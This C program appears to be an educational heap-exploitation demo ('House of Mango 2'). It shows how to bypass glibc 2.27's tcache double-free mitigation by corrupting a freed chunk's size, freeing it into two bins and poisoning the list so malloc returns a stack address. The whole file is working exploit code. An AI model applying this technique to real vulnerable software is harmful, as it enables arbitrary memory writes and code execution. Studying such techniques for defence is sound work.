#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

/**
 * Author : 0xd3xt3r
 * 
 * Double free vulneribity in on tcache bins is mitigated in 2.27 and later
 * can be seen in commit bcdaad21d4635931d1bd3b54a7894276925d081d
 * This has fixed the attack which gives arbitrary write vulneribity in glibc
 * double free. This attack will demonstrate how we can bypass this mitigation
 * and get an arbitrary write with the new mitigation applied.
 * 
 * This Attack works as follows:
 * 
 * 1. Free an allocated chunk
 * 2. Change the size of the chunk and either by realloc or overflow from the
 *    previous chunk
 * 3. Free the same chunk again, now you have same chunk in two tcache bins.
 * 4. Request the chunk from either of the bins
 * 5. Now write the fake chunk address in the first 4/8 bytes of the newly
 *    requested chunk. This will poison the tcache list having this chunk.
 * 6. Subsequent request to the tcache list containing the poisoned chunk
 *    will return our target memory area.
 */

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    printf("Welcome to House of Mango 2!\n");
    printf("Tested on Ubuntu 18.04 64bit (glibc-2.27) and works on 2.27 and later\n");
    intptr_t fake_chunk[4];
    printf("\nThe address we want malloc() to return is %p.\n", (char *)&fake_chunk);

    intptr_t *victim_chunk = malloc(0x30);
    printf("first chunk returned by malloc victim_chunk: %p\n", victim_chunk);
    // first free
    free(victim_chunk);

    intptr_t *victim_chunk_header = victim_chunk - 2;
    // <Vulneribilty>
    printf("Now we change the size of the chunk in tcache_bins either by overflow or realloc function\n");
    // this overflow could also be done by adjusent chunk
    victim_chunk_header[1] = 0x51;
    // victim_chunk = realloc(victim_chunk, 0x50);
    //</Vulneribilty>

    printf("Freeing the overflowen chunk\n");
    free(victim_chunk); // victim_chunk is already freed before
    printf("This free has place the chunk %p in two tcache bins one of size 0x30 and other of size 0x40\n", victim_chunk);
    printf("So effective we have two tcache bins with same chunk %p\n", victim_chunk);

    intptr_t *b = malloc(0x40);
    printf("Tcache return the chunk which we freed earlier %p\n", b);
    printf("Time to poison the tcache bins with our fake chunk address\n");
    b[0] = (intptr_t)&fake_chunk;
    printf("Now chunk %p is in tcache bin (0x30) next points to %p\n", b, fake_chunk);
    intptr_t *c = malloc(0x30);
    printf("Request to malloc will return the same chunk as before %p\n", c);
    intptr_t *target_fake_chunk = malloc(0x30);
    printf("Another request returns the fake chunk %p\n", target_fake_chunk);
    assert(target_fake_chunk == fake_chunk);
    printf("Got control on target/stack!\n\n");
}
